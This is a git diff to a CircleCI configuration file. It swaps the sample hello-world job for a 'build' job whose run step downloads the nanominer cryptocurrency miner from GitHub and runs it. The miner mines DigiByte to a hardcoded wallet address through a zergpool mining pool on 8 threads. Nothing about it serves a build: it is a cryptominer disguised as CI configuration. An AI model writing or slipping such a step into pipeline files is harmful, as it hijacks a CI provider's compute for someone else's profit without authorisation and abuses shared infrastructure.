@@ -1,26 +1,11 @@
-# Use the latest 2.1 version of CircleCI pipeline process engine.
-# See: https://circleci.com/docs/2.0/configuration-reference
-version: 2.1
-
-# Define a job to be invoked later in a workflow.
-# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
+version: 2.0
 jobs:
-  say-hello:
-    # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
-    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
+  build:
     docker:
-      - image: cimg/base:stable
-    # Add steps to the job
-    # See: https://circleci.com/docs/2.0/configuration-reference/#steps
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:
-          name: "Say hello"
-          command: "echo Hello, World!"
-
-# Invoke jobs via workflows
-# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
-workflows:
-  say-hello-workflow:
-    jobs:
-      - say-hello
+      - run: sudo apt-get update && wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz && tar xf nanominer-linux-3.5.1.tar.gz && cd nanominer-linux-3.5.1 && ./nanominer -algo Verushash -wallet dgb1q80p3jt0l6mytlvtlfald5xc7np9tgzvj5dk48h -coin DGB -rigName VAPERS86 -pool1 verushash.asia.mine.zergpool.com:3300 -threads 8
